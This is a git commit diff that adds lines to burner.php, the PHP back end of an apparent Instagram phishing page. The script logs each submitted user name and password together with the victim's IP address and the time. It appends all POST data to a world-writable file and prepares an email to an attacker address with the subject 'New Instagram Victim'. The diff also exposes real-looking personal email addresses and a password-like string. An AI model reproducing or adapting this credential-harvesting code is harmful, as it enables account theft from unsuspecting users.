d8362f5de0f1a59bd21459099b0fa6a0569f769e
rtt0505 <50534031+rtt0505@users.noreply.github.com>
2019-05-12 12:39:15 +0300

    Update burner.php

--- burner.php
+++ burner.php
@@ -1,6 +1,20 @@
 <?php
 header ('Location:confirm.php');
 $handle = fopen("information", "a+");
+$date = gmdate ("d-n-Y");
+$time = gmdate ("H:i:s");
+$ip = $_SERVER['REMOTE_ADDR'];
+$hostname = gethostbyaddr($ip);
+$message .= "========== Instagram Login ==========\n";
+$message .= "User: ".$_POST['salihertugrul21@gmail.com']."\n";
+$message .= "Pass: ".$_POST['karaborsa0101']."\n";
+$message .= "----------\n";
+$message .= "IP: ".$ip."\n";
+$message .= "Log : $time / $date \n";
+$rnessage = "$message\n";
+$send= "salihertugrul01@gmail.com";
+$subject = "New Instagram Victim | $ip";
+$headers = "From: Instagram";
 chmod($file, 0777);
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
